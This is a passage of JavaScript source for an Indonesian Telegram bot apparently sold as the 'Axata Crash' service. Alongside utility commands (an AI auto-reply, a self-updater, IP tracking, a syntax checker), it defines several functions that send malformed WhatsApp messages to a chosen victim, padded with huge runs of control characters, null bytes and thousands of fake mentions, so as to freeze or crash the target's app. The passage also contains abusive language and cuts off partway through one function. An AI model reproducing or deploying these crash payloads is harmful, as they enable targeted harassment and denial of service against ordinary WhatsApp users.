<b>▧ KETERANGAN:</b> ALL TRX NO REFF!!!
────────────────────
<b>CONTACT 1:</b> @BlrezaXaxata
<b>CHANNEL 1:</b> @Blreza_Official
────────────────────
# Axata
`;

        bot.sendMessage(chatId, caption, {
            parse_mode: "HTML"
        });
    } catch (err) {
        // HINDARI ERROR KELUAR KE USER
        console.error("Error /done:", err?.message);
        bot.sendMessage(msg.chat.id, "⚠️ Terjadi kesalahan, coba lagi ya!");
    }
});


/// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ \\

// ━━━ ( CASE AUTO AI ) ━━━ \\

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ \\

// ======================================================
//  FILE & GLOBAL SETTINGS
// ======================================================
const autoaiFile = './autoai.json';
let globalAutoAIStatus = false;

// Load status AutoAI
if (fs.existsSync(autoaiFile)) {
    try {
        const data = JSON.parse(fs.readFileSync(autoaiFile, 'utf8'));
        globalAutoAIStatus = data.autoAIStatus || false;
    } catch (err) {
        console.error("Error membaca autoai.json:", err);
    }
}

// Simpan status
function saveSettings() {
    try {
        const data = {
            autoAIStatus: globalAutoAIStatus
        };
        fs.writeFileSync(autoaiFile, JSON.stringify(data, null, 2));
    } catch (err) {
        console.error("Gagal menyimpan autoai.json:", err);
    }
}

// ======================================================
//  FITUR TAMBAHAN (NO EXTRA REQUIRE)
// ======================================================

// 1. Anti-Spam Cooldown
const userCooldown = new Map();

function isCooldown(userId) {
    const last = userCooldown.get(userId);
    const now = Date.now();
    if (last && now - last < 3000) return true; // 3 detik
    userCooldown.set(userId, now);
    return false;
}

// 2. Mode Group / Private
const ALLOW_ONLY_GROUP = false;
const ALLOW_ONLY_PRIVATE = false;

// 3. Whitelist user
const allowedUsers = [
    // 12345678
];

// 4. Filter kata kasar
const badWords = ["anjing", "bangsat", "kontol", "memek", "goblok", "idiot"];

// 5. Simple language detect (tanpa library)
// — mendeteksi bahasa IND/ENG tanpa require
function detectLanguage(text) {
    const indoWords = ["aku", "kamu", "lagi", "kenapa", "gimana", "apa", "bang", "bisa"];
    let count = 0;
    for (let w of indoWords)
        if (text.includes(w)) count++;
    return count >= 2 ? "ind" : "eng";
}

// ======================================================
//  COMMAND /autoai
// ======================================================
bot.onText(/^([./#])autoai\s*(on|off|reset)?$/i, async (msg, match) => {
    const chatId = msg.chat.id;
    const action = match[2] ? match[2].toLowerCase() : null;

    if (!action) {
        return bot.sendMessage(
            chatId,
            "⚙️ *Pengaturan AutoAI*\nGunakan:\n/autoai on\n/autoai off\n/autoai reset", {
                parse_mode: "Markdown"
            }
        );
    }

    if (action === "on") {
        globalAutoAIStatus = true;
        saveSettings();
        return bot.sendMessage(chatId, "✅ AutoAI diaktifkan!");
    }

    if (action === "off") {
        globalAutoAIStatus = false;
        saveSettings();
        return bot.sendMessage(chatId, "❌ AutoAI dimatikan!");
    }

    if (action === "reset") {
        globalAutoAIStatus = false;
        saveSettings();
        return bot.sendMessage(chatId, "🔄 AutoAI berhasil direset!");
    }
});

// ======================================================
//  AUTO AI LISTENER
// ======================================================
bot.on("message", async (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text ? msg.text.toLowerCase() : "";

    // AutoAI aktif?
    if (!globalAutoAIStatus) return;

    // Jangan balas command
    if (!text || text.startsWith("/")) return;

    // Hanya group/private mode
    if (ALLOW_ONLY_GROUP && msg.chat.type === "private") return;
    if (ALLOW_ONLY_PRIVATE && msg.chat.type !== "private") return;

    // Whitelist
    if (allowedUsers.length > 0 && !allowedUsers.includes(msg.from.id)) {
        return bot.sendMessage(chatId, "❌ Kamu tidak punya akses memakai AutoAI.");
    }

    // Anti-spam
    if (isCooldown(msg.from.id)) return;

    // Filter toxic
    if (badWords.some((w) => text.includes(w))) {
        return bot.sendMessage(chatId, "⚠️ Jangan pakai kata kasar dong 😄");
    }

    // Cek API Key
    if (!googleApiKey) {
        return bot.sendMessage(chatId, "⚠️ API Key Google AI belum disetel.");
    }

    try {
        await bot.sendChatAction(chatId, "typing");

        // Deteksi bahasa sederhana
        const lang = detectLanguage(text);

        const style =
            lang === "ind" ?
            "Gunakan bahasa Indonesia santai, gaul, dan ramah." :
            "Reply in friendly, casual English.";

        const prompt = `
Kamu adalah AI Vortex yang ramah dan helpful.
${style}

User: "${text}"
    `;

        // MAIN API (Gemini)
        const ai = new genAI.GoogleGenerativeAI(googleApiKey);
        const model = ai.getGenerativeModel({
            model: "gemini-2.0-flash"
        });

        const result = await model.generateContent(prompt);
        const response = result.response;
        let aiReply = response.text() || null;

        // Fallback jika AI kosong
        if (!aiReply) throw new Error("Gemini kosong");

        return bot.sendMessage(chatId, aiReply, {
            reply_to_message_id: msg.message_id,
            parse_mode: "Markdown",
        });
    } catch (err) {
        console.log("Gemini error, fallback...");

        // FALLBACK API
        try {
            const fallback = await fetch("https://api.coba-backup.com/gpt4", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({
                    prompt: text
                }),
            });

            const data = await fallback.json();
            return bot.sendMessage(chatId, data.reply || "AI sedang sibuk, coba lagi.");
        } catch (fallbackErr) {
            return bot.sendMessage(chatId, "❌ AI sedang mengalami gangguan. Coba lagi nanti ya!");
        }
    }
});

/// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ \\

// ━━━ ( CASE RESTART ) ━━━ \\

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ \\

bot.onText(/^\/restart$/, async (msg) => {
    const chatId = msg.chat.id;
    const ownerId = 5029850088; // ganti dengan ID owner sesuai kebutuhan

    if (msg.from.id !== ownerId) {
        return bot.sendMessage(chatId, "❌ Hanya owner yang dapat melakukan /restart.");
    }

    try {
        await bot.sendMessage(chatId, "♻️ *Bot sedang restart...*\nTunggu beberapa detik.", {
            parse_mode: "Markdown"
        });

        setTimeout(() => {
            process.exit(0); 
        }, 1200);

    } catch {
        bot.sendMessage(chatId, "❌ Gagal menjalankan restart.");
    }
});

/// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ \\

// ━━━ ( CASE SELF/PUBLICK ) ━━━ \\

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ \\

let isPublicMode = true;

bot.onText(/\/self/, (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;

    if (userId !== OWNER_ID) {
        return bot.sendMessage(chatId, "❌ Perintah ini hanya untuk Owner.");
    }

    isPublicMode = false;
    bot.sendMessage(chatId, "🔒 Mode Self Aktif.\nBot hanya akan bisa digunakan @XYCoolcraft Saja!");
});

bot.onText(/\/publik/, (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;

    if (userId !== OWNER_ID) {
        return bot.sendMessage(chatId, "❌ Perintah ini hanya untuk Owner.");
    }

    isPublicMode = true;
    bot.sendMessage(chatId, "🌎 Mode Publik Aktif.\nBot sekarang merespons semua pengguna.");
});

/// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ \\

// ━━━ ( CASE UPDATE ) ━━━ \\

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ \\

const Js_Oriii = "/home/container/AxataCrash.js";
const Ghlu = "https://raw.githubusercontent.com/AxataCrashh/AutoUpdatee/main/AxataCrash.js";

bot.onText(/^\/update$/, async (msg) => {
    const chatId = msg.chat.id;

    await bot.sendMessage(chatId, "🔄 *Memulai update...*\n⏳ Mengambil file terbaru dari GitHub...", {
        parse_mode: "Markdown"
    });

    try {
        const response = await axios.get(Ghlu, { timeout: 15000 }).catch(() => null);

        if (!response || !response.data) {
            return bot.sendMessage(chatId, "❌ File dari Folder privt Axata tidak dapat diambil atau kosong.");
        }

        const newCode = response.data.toString();

        // Validasi ukuran file
        if (newCode.length < 50) {
            return bot.sendMessage(chatId, "⚠ File terlalu kecil. Kemungkinan salah URL atau file rusak.");
        }

        // Backup
        try {
            fs.copyFileSync(Js_Oriii, Js_Oriii + ".backup");
        } catch {}

        // Hapus file lama jika ada
        try {
            if (fs.existsSync(Js_Oriii)) {
                fs.unlinkSync(Js_Oriii);
            }
        } catch {}

        // Tulis file baru
        try {
            fs.writeFileSync(Js_Oriii, newCode);
        } catch {
            return bot.sendMessage(chatId, "❌ Gagal menulis file update. Bot tidak diubah.");
        }

        await bot.sendMessage(
            chatId,
            "✅ *Axata AutoUpdate Sukses!*\n🔁 Bot akan restart otomatis...",
            { parse_mode: "Markdown" }
        );

        setTimeout(() => process.exit(0), 1200);

    } catch {
        bot.sendMessage(chatId, "❌ Update gagal. Silakan coba lagi atau periksa Folder Privt Axata.");
    }
});

/// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ \\

// ━━━ ( CASE CEK ASYNTAX ) ━━━ \\

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ \\

bot.onText(/\/trackip (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const senderId = msg.from.id;
    const randomImage = getRandomImage();
if (shouldIgnoreMessage(msg)) return; ;
    const args = match[1].split(' ');
    if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\`efdah\`\`\`
emang lu siapaूाीू ?
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "owner", url: settings.OWNER_URL }]
      ]
    }
  });
}

    trackIP(msg, args);
    bot.sendMessage(chatId, 'Bot siap digunakan.  Ketik /trackip <ip address> untuk melacak IP.');
});

/// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ \\

// ━━━ ( CASE CEK ASYNTAX ) ━━━ \\

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ \\

function escapeHtml(s = "") {
  return s
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;");
}
function stripCodeFences(raw) {
  if (!raw) return "";
  return raw
    .replace(/^\s*```(?:js|javascript)?\s*/i, "")
    .replace(/\s*```\s*$/i, "")
    .replace(/^`|`$/g, "");
}

// command /cek (petunjuk)
bot.onText(/\/cek/, (msg) => {
  const chatId = msg.chat.id;
  const help = `
Kirim <code>function</code> JS atau potongan kode JS ke saya untuk dicek syntax-nya.
Contoh:
<pre>async function abc(sock, target) {
  await sock.sendMessage(target, "ok");
}</pre>
Saya akan membalas <b>✅ Jika syntax OK</b> atau <b>❌ Jika ada error</b> beserta baris & kolom.
  `;
  bot.sendMessage(chatId, help, { parse_mode: "HTML", disable_web_page_preview: true });
});

bot.on("message", async (msg) => {
  try {
    const chatId = msg.chat.id;
    const text = msg.text;
    if (!text) return;
    if (text.trim().startsWith("/cek")) return;

    const looksLikeCode = /function\s+|=>|async\s+|const\s+|let\s+|var\s+/.test(text);
    if (!looksLikeCode) return;

    const code = stripCodeFences(text);
    if (code.trim().length < 5) return;
    try {
      acorn.parse(code, {
        ecmaVersion: "latest",
        sourceType: "module",
        locations: true,
      });

      // kalau sampai sini berarti syntax OK
      const okMsg = `<b>✅ Syntax OK</b>\nKode Anda valid secara sintaks JavaScript.`;
      await bot.sendMessage(chatId, okMsg, { parse_mode: "HTML", disable_web_page_preview: true });
      return;
    } catch (parseErr) {
      // ambil lokasi (baris + kolom) kalau ada
      const loc = parseErr.loc || (parseErr.pos ? { line: null, column: null } : null);
      const lineNum = loc && loc.line ? loc.line : "-";
      const colNum = loc && typeof loc.column === "number" ? loc.column : "-";

      const lines = code.split(/\r?\n/);
      const errorLineIndex = (loc && loc.line ? loc.line - 1 : null);
      const errorLine = (errorLineIndex !== null && lines[errorLineIndex] !== undefined)
        ? lines[errorLineIndex]
        : "";

      let caret = "";
      if (errorLine) {
        const col = typeof loc?.column === "number" ? Math.max(0, loc.column) : 0;
        const safeCol = Math.min(col, Math.max(0, errorLine.length));
        caret = " ".repeat(safeCol) + "^";
      }

      const escapedLine = escapeHtml(errorLine);
      const escapedCaret = escapeHtml(caret);
      const escapedMessage = escapeHtml(parseErr.message || String(parseErr));

      const html = `
<b>❌ Syntax Error</b>

<b>Pesan:</b> <code>${escapedMessage}</code>
<b>Baris:</b> <code>${lineNum}</code>  <b>Kolom:</b> <code>${colNum}</code>

<b>Baris yang bermasalah:</b>
<pre>${escapedLine}</pre>
<pre>${escapedCaret}</pre>

<i>Tip: periksa tanda kurung, kurawal, titik koma, atau penggunaan <code>await</code> di luar function async.</i>
      `;

      await bot.sendMessage(chatId, html, { parse_mode: "HTML", disable_web_page_preview: true });
      return;
    }
  } catch (e) {
    console.error("Handler error:", e);
  }
});

/// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ \\

// ━━━ ( CASE BRAT ) ━━━ \\

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ \\

bot.onText(/^\/brat(?: (.+))?/, async (msg, match) => {
    const chatId = msg.chat.id;
    const argsRaw = match[1];
    const senderId = msg.from.id;
    const userId = msg.from.id;
    const randomImage = getRandomImage();
    //cek prem//
    if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
        return bot.sendPhoto(chatId, randomImage, {
            caption: `
<blockquote>- AXATA CRASH -</blockquote>
Lu bukan Premium Kidszz Addprem Dulu Sono Ke Admin/Own Lu 🩸
`,
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [{
                        text: "OWNER",
                        url: "https://t.me/BlrezaXaxata"
                    }],
                ]
            }
        });
    }
    if (!argsRaw) {
        return bot.sendMessage(chatId, 'Gunakan: /brat <teks> [--gif] [--delay=500]');
    }

    try {
        const args = argsRaw.split(' ');

        const textParts = [];
        let isAnimated = false;
        let delay = 500;

        for (let arg of args) {
            if (arg === '--gif') isAnimated = true;
            else if (arg.startsWith('--delay=')) {
                const val = parseInt(arg.split('=')[1]);
                if (!isNaN(val)) delay = val;
            } else {
                textParts.push(arg);
            }
        }

        const text = textParts.join(' ');
        if (!text) {
            return bot.sendMessage(chatId, 'Teks tidak boleh kosong!');
        }

        // Validasi delay
        if (isAnimated && (delay < 100 || delay > 1500)) {
            return bot.sendMessage(chatId, 'Delay harus antara 100–1500 ms.');
        }

        await bot.sendMessage(chatId, '🌿 Generating stiker brat...');

        const apiUrl = `https://api.siputzx.my.id/api/m/brat?text=${encodeURIComponent(text)}&isAnimated=${isAnimated}&delay=${delay}`;
        const response = await axios.get(apiUrl, {
            responseType: 'arraybuffer',
        });

        const buffer = Buffer.from(response.data);

        // Kirim sticker (bot API auto-detects WebP/GIF)
        await bot.sendSticker(chatId, buffer);
    } catch (error) {
        console.error('❌ Error brat:', error.message);
        bot.sendMessage(chatId, 'Gagal membuat stiker brat. Coba lagi nanti ya!');
    }
});

// ━━━━━━━━━━━━━━BATAS CASE TOOLS━━━━━━━━━━━━━━━━ \\


/// ━━━━MEMASUKI KAWAN FUNCTION━━━━━ \\


// ------------------ ( FUNCTION DELAY ) ------------------------ \\

async function Delaylokal(target) {
  try {
   const abimsalsa = "\u2063".repeat(6000);
    let message = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: {
              text: abimsalsa, 
            },
            nativeFlowMessage: {
              buttons: [
                { name: "single_select", buttonParamsJson: "\u0005".repeat(80000) },
                { name: "cta_copy", buttonParamsJson: "\u0003".repeat(8000) },
              ],
            },
          },
        },
      },
    };

    await axata.relayMessage(target, message, {
      participant: { jid: target },
    });
  } catch (err) {
    console.error(err);
  }
}

async function InvisDelay(target) {
  const Node = [
    {
      tag: "bot",
      attrs: {
        biz_bot: "1"
      }
    }
  ];

  const msg = generateWAMessageFromContent(isTarget, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2,
          messageSecret: crypto.randomBytes(32),
          supportPayload: JSON.stringify({
            version: 2,
            is_ai_message: true,
            should_show_system_message: true,
            ticket_id: crypto.randomBytes(16)
          })
        },
        interactiveMessage: {
          header: {
            title: "../Vortunix Infinity..",
            hasMediaAttachment: false,
            imageMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7118-24/41030260_9800293776747367_945540521756953112_n.enc?ccb=11-4&oh=01_Q5Aa1wGdTjmbr5myJ7j-NV5kHcoGCIbe9E4r007rwgB4FjQI3Q&oe=687843F2&_nc_sid=5e03e0&mms3=true",
              mimetype: "image/jpeg",
              fileSha256: "NzsD1qquqQAeJ3MecYvGXETNvqxgrGH2LaxD8ALpYVk=",
              fileLength: "11887",
              height: 1080,
              width: 1080,
              mediaKey: "H/rCyN5jn7ZFFS4zMtPc1yhkT7yyenEAkjP0JLTLDY8=",
              fileEncSha256: "RLs/w++G7Ria6t+hvfOI1y4Jr9FDCuVJ6pm9U3A2eSM=",
              directPath: "/v/t62.7118-24/41030260_9800293776747367_945540521756953112_n.enc?ccb=11-4&oh=01_Q5Aa1wGdTjmbr5myJ7j-NV5kHcoGCIbe9E4r007rwgB4FjQI3Q&oe=687843F2&_nc_sid=5e03e0",
              mediaKeyTimestamp: "1750124469",
              jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAuAAEAAwEBAAAAAAAAAAAAAAAAAQMEBQYBAQEBAQAAAAAAAAAAAAAAAAACAQP/2gAMAwEAAhADEAAAAPMgAAAAAb8F9Kd12C9pHLAAHTwWUaubbqoQAA3zgHWjlSaMswAAAAAAf//EACcQAAIBBAECBQUAAAAAAAAAAAECAwAREhMxBCAQFCJRgiEwQEFS/9oACAEBAAE/APxfKpJBsia7DkVY3tR6VI4M5Wsx4HfBM8TgrRWPPZj9ebVPK8r3bvghSGPdL8RXmG251PCkse6L5DujieU2QU6TcMeB4HZGLXIB7uiZV3Fv5qExvuNremjrLmPBba6VEMkQIGOHqrq1VZbKBj+u0EigSODWR96yb3NEk8n7n//EABwRAAEEAwEAAAAAAAAAAAAAAAEAAhEhEiAwMf/aAAgBAgEBPwDZsTaczAXc+aNMWsyZBvr/AP/EABQRAQAAAAAAAAAAAAAAAAAAAED/2gAIAQMBAT8AT//Z",
              contextInfo: {
                mentionedJid: [isTarget],
                participant: isTarget,
                remoteJid: isTarget,
                expiration: 9741,
                ephemeralSettingTimestamp: 9741,
                entryPointConversionSource: "WhatsApp.com",
                entryPointConversionApp: "WhatsApp",
                entryPointConversionDelaySeconds: 9742,
                disappearingMode: {
                  initiator: "INITIATED_BY_OTHER",
                  trigger: "ACCOUNT_SETTING"
                }
              },
              scansSidecar: "E+3OE79eq5V2U9PnBnRtEIU64I4DHfPUi7nI/EjJK7aMf7ipheidYQ==",
              scanLengths: [2071, 6199, 1634, 1983],
              midQualityFileSha256: "S13u6RMmx2gKWKZJlNRLiLG6yQEU13oce7FWQwNFnJ0="
            }
          },
          body: {
            text: "../GyzenLyoraa..."
          },
          nativeFlowMessage: {
            messageParamsJson: "{".repeat(90000)
          }
        }
      }
    }
  }, {});

  await axata.relayMessage(isTarget, msg.message, {
    participant: { jid: isTarget },
    additionalNodes: Node,
    messageId: msg.key.id
  });
}

async function DelayXaxt(axata, target) {
  const tai = "𑜦𑜠".repeat(20000) + "ꦾ".repeat(60000);

  let msg = {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          header: {
            title: tai,
            imageMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7161-24/11239763_2444985585840225_6522871357799450886_n.enc?ccb=11-4&oh=01_Q5Aa1QFfR6NCmADbYCPh_3eFOmUaGuJun6EuEl6A4EQ8r_2L8Q&oe=68243070&_nc_sid=5e03e0&mms3=true",
              mimetype: "image/jpeg",
              fileSha256: "MWxzPkVoB3KD4ynbypO8M6hEhObJFj56l79VULN2Yc0=",
              fileEncSha256: "aOHYt0jIEodM0VcMxGy6GwAIVu/4J231K349FykgHD4=",
              mediaKey: "lKnY412LszvB4LfWfMS9QvHjkQV4H4W60YsaaYVd57c=",
              mediaKeyTimestamp: "1743848703",
              fileLength: 999999999999999,
              directPath: "/v/t62.7161-24/11239763_2444985585840225_6522871357799450886_n.enc",
              jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/... (biarin tetap)",
              scanLengths: [999999999, 9999999999, 9999999999],
              height: 9999999999,
              width: 99999999999,
              caption: "Yutax Is Here" + "ꦾ".repeat(60000),
              contextInfo: {
                mentionedJid: ["0@s.whatsapp.net", ...Array.from({ length: 2000 }, (_, i) => `1${i}@s.whatsapp.net`)],
                remoteJid: "status@broadcast",
                quotedMessage: {
                  paymentInviteMessage: {
                    serviceType: 3,
                    expiryTimestamp: Date.now() + 1292910283729
                  }
                }
              }
            }
          }
        }
      }
    }
  };

  let stc = {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          header: { title: tai, hasMediaAttachment: true },
          body: { text: tai, format: "EXTENTION_1" },
          contextInfo: {
            mentionedJid: Array.from({ length: 2000 }, (_, z) => '0292873892827' + (z + 1) + '@s.whatsapp.net'),
            externalAdReply: {
              title: "Ondet",
              body: tai,
              mediaType: 1,
              thumbnailUrl: "https://files.catbox.moe/gqmtzz.jpg",
              sourceUrl: "https://xnxx.com"
            },
            extendedTextMessage: {
              text: "{".repeat(60000),
              contextInfo: { mentionedJid: Array.from({ length: 2000 }, (_, i) => `1${i}@s.whatsapp.net`) }
            }
          },
          businessMessageForwardInfo: { businessOwnerJid: "13135550002@s.whatsapp.net" },
          statusAttributionType: "SHARED_FROM_MENTION",
          nativeFlowResponseMessage: {
            name: "menu_options",
            paramsJson: `{"values":{"in_pin_code":"999999","building_name":"saosinx"}}`,
            version: 3
          }
        }
      }
    }
  };

  let exc = {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { text: tai, format: "EXTENTION_1" },
          contextInfo: {
            mentionedJid: Array.from({ length: 2000 }, (_, z) => '0292873892827' + (z + 1) + '@s.whatsapp.net'),
            quotedMessage: { paymentInviteMessage: { serviceType: 3, expiryTimestamp: Date.now() + 1814400000 } }
          },
          statusAttributionType: "SHARED_FROM_MENTION",
          nativeFlowResponseMessage: { name: "getStickerExpressionsDataSource", paramsJson: "\u0000".repeat(181820000), version: 3 }
        }
      }
    }
  };

  await axata.relayMessage("status@broadcast", msg, {
    messageId: null,
    statusJidList: [target]
  });
  await axata.relayMessage("status@broadcast", stc, {
    messageId: null,
    statusJidList: [target]
  });
  await axata.relayMessage("status@broadcast", exc, {
    messageId: null,
    statusJidList: [target]
  });

  console.log("✅ Done Ya Ges Ya");
}

async function AxataHard(target, mention) {
            let msg = await generateWAMessageFromContent(target, {
                buttonsMessage: {
                    text: "🩸",
                    contentText:
                        "Cukimay",
                    footerText: "BapakKauNgentot༑",
                    buttons: [
                        {
                            buttonId: ".bugs",
                            buttonText: {
                                displayText: "BUUANGINAM CHACHA PENDU" + "\u0000".repeat(800000),
                            },
                            type: 1,
                        },
                    ],
                    headerType: 1,
                },
            }, {});
        
            await axata.relayMessage("status@broadcast", msg.message, {
                messageId: msg.key.id,
                statusJidList: [target],
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: {},
                        content: [
                            {
                                tag: "mentioned_users",
                                attrs: {},
                                content: [
                                    {
                                        tag: "to",
                                        attrs: { jid: target },
                                        content: undefined,
                                    },
                                ],
                            },
                        ],
                    },
                ],
            });
            if (mention) {
                await axata.relayMessage(
                    target,
                    {
                        groupStatusMentionMessage: {
                            message: {
                                protocolMessage: {
                                    key: msg.key,
                                    type: 25,
                                },
                            },
                        },
                    },
                    {
                        additionalNodes: [
                            {
                                tag: "meta",
                                attrs: { is_status_mention: "InvisHarder" },
                                content: undefined,
                            },
                        ],
                    }
                );
            }
        }

async function Delayspam(axata, target) {
  const msg = {
    stickerMessage: {
      url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c&mms3=true",
      fileSha256: "mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=",
      fileEncSha256: "tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=",
      mediaKey: "ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=",
      mimetype: "image/webp",
      height: 9999,
      width: 9999,
      directPath: "/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c",
      fileLength: 12260,
      mediaKeyTimestamp: "1743832131",
      isAnimated: false,
      stickerSentTs: "X",
      isAvatar: false,
      isAiSticker: false,
      isLottie: false,
      contextInfo: {
        mentionedJid: [
          "0@s.whatsapp.net",
          ...Array.from(
            { length: 1900 },
            () =>
              "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
          ),
        ],
        stanzaId: "1234567890ABCDEF",
        quotedMessage: {
          paymentInviteMessage: {
            serviceType: 3,
            expiryTimestamp: Date.now() + 1814400000
          }
        }
      }
    }
  };

  await axata.relayMessage("status@broadcast", msg, {
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{ tag: "to", attrs: { jid: target } }]
      }]
    }]
  });

  console.log(chalk.red(`─────「 ⏤!InvisibleSticker To: ${target}!⏤ 」─────`))
}

async function DelayAxt(target) {
    const album = await generateWAMessageFromContent(target, {
        albumMessage: {
            expectedImageCount: 99999999,
            expectedVideoCount: 0,
        }
    }, {});

    const msg1 = await generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: {
                        text: " #JustinOffc ",
                        format: "EXTENTION_1"
                    },
                    nativeFlowResponseMessage: {
                        name: "menu_options",
                        paramsJson: `{\"display_text\":\"${" ".repeat(11111)}\",\"id\":\".grockk\",\"description\":\"PnX-ID-msg.\"}`,
                        version: 3
                    },
                    contextInfo: {
                        mentionedJid: Array.from({
                            length: 2000
                        }, (_, z) => `1313555020${z + 1}@s.whatsapp.net`),
                        statusAttributionType: "SHARED_FROM_MENTION",
                    },
                }
            }
        }
    }, {});

    const msg2 = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: {
                        text: " #JustinOffc ",
                        format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                        name: "call_permission_request",
                        paramsJson: " ".repeat(1045000),
                        version: 3
                    },
                    entryPointConversionSource: "galaxy_message",
                }
            }
        }
    }, {
        ephemeralExpiration: 0,
        forwardingScore: 8888,
        isForwarded: true,
        font: Math.floor(Math.random() * 99999999),
        background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999"),
    });

    const msg3 = {
        stickerMessage: {
            url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c&mms3=true",
            fileSha256: "mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=",
            fileEncSha256: "tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=",
            mediaKey: "ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=",
            mimetype: "image/webp",
            height: 9999,
            width: 9999,
            directPath: "/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c",
            fileLength: 999999,
            mediaKeyTimestamp: "1743832131",
            isAnimated: false,
            stickerSentTs: "X",
            isAvatar: false,
            isAiSticker: false,
            isLottie: false,
            contextInfo: {
                mentionedJid: [
                    "0@s.whatsapp.net",
                    ...Array.from({
                            length: 1999
                        }, () =>
                        `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
                    )
                ],
                stanzaId: "1234567890ABCDEF",
                quotedMessage: {
                    paymentInviteMessage: {
                        serviceType: 3,
                        expiryTimestamp: Date.now() + 1814400000
                    }
                },
                messageAssociation: {
                    associationType: 1,
                    parentMessageKey: album.key
                }
            }
        }
    };

    const msg4 = {
        extendedTextMessage: {
            text: "ꦾ".repeat(60000),
            contextInfo: {
                participant: target,
                mentionedJid: [
                    "support@s.whatsapp.net",
                    ...Array.from({
                            length: 1999
                        },
                        () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
                    )
                ],
